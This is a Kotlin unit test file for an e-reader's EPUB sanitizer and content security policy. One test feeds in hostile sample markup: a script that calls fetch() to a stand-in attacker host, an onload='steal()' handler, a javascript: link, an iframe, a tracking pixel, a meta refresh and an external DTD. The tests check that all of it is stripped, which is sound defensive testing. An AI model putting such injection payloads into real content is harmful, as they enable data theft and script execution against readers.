package com.ermao.library.features.reader.infrastructure

import com.ermao.library.design.GeneratedDesignTokens
import com.ermao.library.shared.modules.reader.domain.ReaderSafetyResourceRole
import com.ermao.library.shared.modules.reader.domain.ReaderSafetyPolicy
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertTrue
import org.junit.Test

class EpubContentSecurityPolicyTest {
    @Test
    fun archiveResourceRoleUsesExplicitControlAndReadingOrderFactsInsteadOfParserPhaseOrMime() {
        val roles = EpubContentSecurityPolicy.ArchiveResourceRoleResolver()

        roles.observeParserAccess("OPS/package.bin")
        assertEquals(
            ReaderSafetyResourceRole.OPTIONAL_RESOURCE,
            roles.roleFor("OPS/package.bin"),
        )
        roles.markControlDocument("OPS/package.bin")
        roles.markReadingOrder(listOf("OPS/chapter.bin"))

        assertEquals(
            ReaderSafetyResourceRole.CONTROL_DOCUMENT,
            roles.roleFor("OPS/package.bin"),
        )
        assertEquals(
            ReaderSafetyResourceRole.READING_ORDER,
            roles.roleFor("OPS/chapter.bin"),
        )
        assertEquals(
            ReaderSafetyResourceRole.OPTIONAL_RESOURCE,
            roles.roleFor("OPS/image.bin"),
        )
    }

    @Test
    fun packageControlRoleComesFromProtectedContainerReference() {
        val roles = EpubContentSecurityPolicy.ArchiveResourceRoleResolver()

        roles.markContainerRootFiles(
            """
                <!-- <rootfile full-path="fake.opf"/> -->
                <container><rootfiles>
                  <rootfile full-path="OPS/package.bin"/>
                </rootfiles></container>
            """.trimIndent(),
        )

        assertEquals(
            ReaderSafetyResourceRole.CONTROL_DOCUMENT,
            roles.roleFor("OPS/package.bin"),
        )
        assertEquals(
            ReaderSafetyResourceRole.OPTIONAL_RESOURCE,
            roles.roleFor("fake.opf"),
        )
    }


    @Test
    fun permitsOnlyBundledReaderFontPathsWithoutUsingAnInvalidCspHostname() {
        val decorated = EpubContentSecurityPolicy.decorateHtml(
            "<html><head></head><body><p>Text</p></body></html>".encodeToByteArray(),
        ).decodeToString()
        assertTrue(decorated.contains("https://*/fonts/reader/"))
        assertTrue(!decorated.contains("https://readium_assets/fonts/reader/"))
        assertTrue(!decorated.contains("font-src *"))
        assertTrue(!decorated.contains("font-src https:"))
    }

    @Test
    fun generatedReaderThemeAdapterClearsAuthoredBackgroundsAndMapsSemanticLinks() {
        val decorated = EpubContentSecurityPolicy.decorateHtml(
            "<html><head></head><body><p>Text</p></body></html>".encodeToByteArray(),
        ).decodeToString()

        assertTrue(decorated.contains("data-shuku-reader-theme-adapter=\"v1\""))
        assertTrue(decorated.contains("background-image: none !important"))
        assertTrue(decorated.contains(":root.readium-sepia-on"))
        assertTrue(decorated.contains(":root.readium-night-on"))
        assertTrue(decorated.contains(GeneratedDesignTokens.Reader.Day.Link))
        assertTrue(decorated.contains(GeneratedDesignTokens.Reader.Warm.Link))
        assertTrue(decorated.contains(GeneratedDesignTokens.Reader.Green.Link))
        assertTrue(decorated.contains(GeneratedDesignTokens.Reader.Night.Link))
    }

    @Test
    fun legacyMobiNamespacesAreBoundBeforeStrictXmlValidation() {
        val body = "<p id=\"one\">原文</p><mbp:pagebreak/><p id=\"two\">Next</p>"
        val source = "<html><head></head><body>$body</body></html>"
        val decorated = EpubContentSecurityPolicy.decorateMobiHtml(source.encodeToByteArray()).decodeToString()
        assertEquals(body, decorated.substringAfter("<body>").substringBefore("</body>"))
        assertTrue(decorated.contains("xmlns=\"http://www.w3.org/1999/xhtml\""))
        assertTrue(decorated.contains("xmlns:mbp="))
        assertEquals("Next", EpubContentSecurityPolicy.locatorBodyProjection(decorated.encodeToByteArray()).last()["text"])
    }

    @Test
    fun locatorProjectionMatchesV4GoldenSemantics() {
        val markup = checkNotNull(javaClass.getResource("/normalization-v4/chapter.xhtml"))
            .readText()

        assertEquals(
            listOf(
                mapOf("path" to "/body[1]", "localName" to "body"),
                mapOf("path" to "/body[1]/h1[1]", "localName" to "h1", "id" to "chapter-title", "text" to "天地玄黄"),
            ),
            EpubContentSecurityPolicy.locatorBodyProjection(markup.encodeToByteArray()),
        )
    }

    @Test
    fun sanitizesAuthorMarkupBeforeDecoratingHead() {
        val input = """
            <html><head>
              <meta http-equiv="refresh" content="0;https://attacker.invalid" />
              <link rel="stylesheet" href="https://attacker.invalid/style.css" />
              <script>fetch('https://attacker.invalid/data')</script>
              <style>.hero { background: url(https://attacker.invalid/image.png); }</style>
            </head><body onload="steal()">
              <iframe src="https://attacker.invalid/frame"></iframe>
              <img src="https://attacker.invalid/pixel.png" />
              <a id="safe" href="https://example.com">Safe link</a>
              <a id="danger" href="javascript:steal()">Dangerous link</a>
            </body></html>
        """.trimIndent()

        val output = EpubContentSecurityPolicy.decorateHtml(input.toByteArray()).toString(Charsets.UTF_8)

        assertTrue(!output.contains("<script"))
        assertTrue(!output.contains("<iframe"))
        assertTrue(!output.contains("onload="))
        assertTrue(!output.contains("javascript:"))
        assertTrue(output.contains("href=\"https://example.com\""))
        assertTrue(output.contains("data-shuku-safety-policy-version=\"${ReaderSafetyPolicy.policyVersion}\""))
        assertTrue(output.contains("script-src https://*/readium/scripts/readium-reflowable.js"))
        assertTrue(!output.contains("http-equiv=\"refresh\""))
    }

    @Test
    fun standardEpubDoctypeAndNonbreakingSpaceRemainReadable() {
        val markup = """<?xml version="1.0"?>
            <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
              "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
            <html xmlns="http://www.w3.org/1999/xhtml"><head><title>EPUB</title></head>
            <body><h1 id="chapter">Chapter&nbsp;One</h1></body></html>
        """.trimIndent()

        val projection = EpubContentSecurityPolicy.locatorBodyProjection(markup.encodeToByteArray())
        val decorated = EpubContentSecurityPolicy.decorateHtml(markup.encodeToByteArray()).decodeToString()

        assertEquals("Chapter One", projection.last()["text"])
        assertTrue(!decorated.contains("<!DOCTYPE"))
        assertTrue(decorated.contains("Chapter&nbsp;One"))
    }

    @Test
    fun rejectsMalformedOrMissingHeadWithoutBlankFallback() {
        assertFailsWith<IllegalArgumentException> {
            EpubContentSecurityPolicy.decorateHtml("<html><body><p>Text</p></body></html>".toByteArray())
        }
        assertFailsWith<Exception> {
            EpubContentSecurityPolicy.decorateHtml("<html><head></head><body><p>Text</body></html>".toByteArray())
        }
        val prepared = EpubContentSecurityPolicy.decorateHtml(
            """<!DOCTYPE html SYSTEM "https://attacker.invalid/book.dtd">
                <html><head></head><body><p>Text</p></body></html>
            """.trimIndent().toByteArray(),
        ).decodeToString()
        assertTrue(!prepared.contains("<!DOCTYPE"))
        assertTrue(prepared.contains("<p>Text</p>"))
    }

    @Test
    fun fakeHeadInsideCommentAndCdataCannotCaptureSecurityDecoration() {
        val markup = """<?xml version="1.0" encoding="utf-8"?>
            <html xmlns="http://www.w3.org/1999/xhtml">
            <!-- <head><script>fake()</script></head> -->
            <head><title>Real</title></head>
            <body><script><![CDATA["<head>fake</head>"]]></script><p>Body</p></body>
            </html>
        """.trimIndent()

        val decorated = EpubContentSecurityPolicy.decorateHtml(markup.encodeToByteArray()).decodeToString()
        val profileIndex = decorated.indexOf(
            "data-shuku-safety-policy-version=\"${ReaderSafetyPolicy.policyVersion}\"",
        )

        assertTrue(profileIndex > decorated.indexOf("<!-- <head>"))
        assertTrue(profileIndex < decorated.indexOf("<title>Real</title>"))
        assertTrue(!decorated.contains("<![CDATA[\"<head>fake</head>\"]]>"))
    }

}
